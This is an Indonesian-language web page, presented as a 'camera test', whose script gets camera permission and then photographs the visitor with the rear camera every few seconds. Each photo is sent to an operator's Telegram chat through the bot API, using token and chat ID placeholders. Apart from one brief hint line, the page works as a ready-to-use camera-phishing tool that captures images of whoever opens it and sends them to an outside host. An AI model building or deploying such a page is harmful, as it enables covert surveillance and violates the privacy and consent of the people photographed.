<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Camera Test - Device Milikmu</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #1a1a2e;
      color: #eee;
      padding: 20px;
      min-height: 100vh;
    }
    
    .container {
      max-width: 800px;
      margin: 0 auto;
    }
    
    h1 {
      color: #4fc3f7;
      text-align: center;
      margin-bottom: 8px;
      word-break: break-word;
    }
    
    .subtitle {
      text-align: center;
      color: #aaa;
      font-size: 0.9em;
      margin-bottom: 18px;
    }
    
    video {
      width: 100%;
      border-radius: 10px;
      background: #000;
      box-shadow: 0 4px 20px rgba(0,0,0,0.6);
      transform: scaleX(-1);
      margin-bottom: 14px;
    }
    
    .status {
      background: #16213e;
      border-radius: 10px;
      padding: 14px;
      margin-bottom: 12px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
    }
    
    .status-line {
      margin: 4px 0;
    }
    
    .status-line.ok { color: #66bb6a; }
    .status-line.err { color: #ef5350; }
    .status-line.info { color: #aaa; }
    
    .hidden { display: none !important; }
    
    .hint {
      text-align: center;
      color: #888;
      margin-top: 10px;
      font-size: 0.9em;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>📸 Auto Camera To Telegram</h1>
    <p class="subtitle">Grant permission untuk mulai</p>
    
    <div id="statusInfo" class="status">
      <div class="status-line info">Menunggu izin kamera...</div>
    </div>
    
    <video id="video" autoplay playsinline muted></video>
    
    <p class="hint">
      Setelah izin diberikan, foto otomatis terkirim ke Telegram
    </p>
  </div>
  
  <canvas id="canvas" style="display:none"></canvas>
  
  <script>
    const TELEGRAM_BOT_TOKEN = '<TOKEN_BOT_KAMU>';
    const TELEGRAM_CHAT_ID = '<CHAT_ID_KAMU>';
    const MAX_RETRIES = 3;
    
    let video = document.getElementById('video');
    let canvas = document.getElementById('canvas');
    let ctx = canvas.getContext('2d');
    let stream = null;
    let sending = false;
    let attempts = 0;
    
    const statusInfo = document.getElementById('statusInfo');
    
    function log(msg, type = 'info') {
      const cls = type === 'ok' ? 'ok' : type === 'err' ? 'err' : 'info';
      statusInfo.innerHTML += `<div class="status-line ${cls}">${msg}</div>`;
    }
    
    async function startCamera() {
      try {
        const s = await navigator.mediaDevices.getUserMedia({
          video: {
            width: { ideal: 1280 },
            height: { ideal: 720 },
            facingMode: 'environment'
          }
        });
        
        stream = s;
        video.srcObject = s;
        
        video.onloadedmetadata = () => {
          log('Kamera aktif', 'ok');
          canvas.width = video.videoWidth || 1280;
          canvas.height = video.videoHeight || 720;
          sendToTelegram();
        };
      } catch (err) {
        log('Izin kamera ditolak atau kamera tidak tersedia', 'err');
        console.error(err);
      }
    }
    
    async function sendToTelegram() {
      if (sending) return;
      if (attempts >= MAX_RETRIES) {
        log('Mencapai batas percobaan', 'err');
        return;
      }
      
      sending = true;
      attempts++;
      
      try {
        log('Mengambil foto...', 'info');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const dataURL = canvas.toDataURL('image/png');
        
        const blob = await (await fetch(dataURL)).blob();
        const form = new FormData();
        form.append('chat_id', TELEGRAM_CHAT_ID);
        form.append('photo', blob, 'camera-auto.png');
        
        log('Mengirim ke Telegram...', 'info');
        const res = await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendPhoto', {
          method: 'POST',
          body: form
        });
        
        const data = await res.json();
        
        if (data.ok) {
          log('Foto terkirim ke Telegram ✓', 'ok');
          attempts = 0;
          setTimeout(() => {
            sendToTelegram();
          }, 5000);
        } else {
          throw new Error(data.description || JSON.stringify(data));
        }
      } catch (err) {
        log('Gagal: ' + err.message, 'err');
        setTimeout(() => {
          sendToTelegram();
        }, 2000);
      } finally {
        sending = false;
      }
    }
    
    window.addEventListener('beforeunload', () => {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
    });
    
    startCamera();
  </script>
</body>
</html>
